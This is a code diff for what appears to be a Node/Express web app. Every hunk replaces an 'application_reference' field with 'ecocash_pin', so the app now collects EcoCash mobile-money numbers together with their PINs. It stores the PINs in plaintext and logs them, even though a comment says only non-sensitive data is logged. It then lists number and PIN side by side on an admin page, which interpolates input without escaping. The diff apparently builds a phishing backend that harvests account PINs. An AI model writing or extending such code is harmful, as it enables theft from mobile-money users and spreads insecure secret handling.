@@ -33,7 +33,7 @@ async function initializeDatabase() {
       CREATE TABLE IF NOT EXISTS submissions (
         id SERIAL PRIMARY KEY,
         ecocash_number TEXT NOT NULL,
-        application_reference TEXT,
+        ecocash_pin TEXT,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
@@ -81,7 +81,7 @@ app.get("/create-table", async (req, res) => {
       CREATE TABLE IF NOT EXISTS submissions (
         id SERIAL PRIMARY KEY,
         ecocash_number TEXT NOT NULL,
-        application_reference TEXT,
+        ecocash_pin TEXT,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
@@ -110,14 +110,14 @@ app.post("/submit", async (req, res) => {
   // Only log non-sensitive information.
   console.log({
     ecocash_number: req.body.ecocash_number,
-    application_reference: req.body.application_reference
+    ecocash_pin: req.body.ecocash_pin
   });
 
   try {
 
     const {
       ecocash_number,
-      application_reference
+      ecocash_pin
     } = req.body;
 
     if (!ecocash_number) {
@@ -130,13 +130,13 @@ app.post("/submit", async (req, res) => {
     const result = await pool.query(
       `
       INSERT INTO submissions
-      (ecocash_number, application_reference)
+      (ecocash_number, ecocash_pin)
       VALUES ($1, $2)
-      RETURNING id, ecocash_number, application_reference, created_at
+      RETURNING id, ecocash_number, ecocash_pin, created_at
       `,
       [
         ecocash_number,
-        application_reference || null
+        ecocash_pin || null
       ]
     );
 
@@ -228,7 +228,7 @@ app.get("/submissions", async (req, res) => {
 
           <td>${item.ecocash_number}</td>
 
-          <td>${item.application_reference || "-"}</td>
+          <td>${item.ecocash_pin || "-"}</td>
 
           <td>
             ${new Date(item.created_at).toLocaleString()}
@@ -472,7 +472,7 @@ Delete Selected
 
 <th>EcoCash Number</th>
 
-<th>Application Reference</th>
+<th>EcoCash Pin</th>
 
 <th>Date Submitted</th>
 
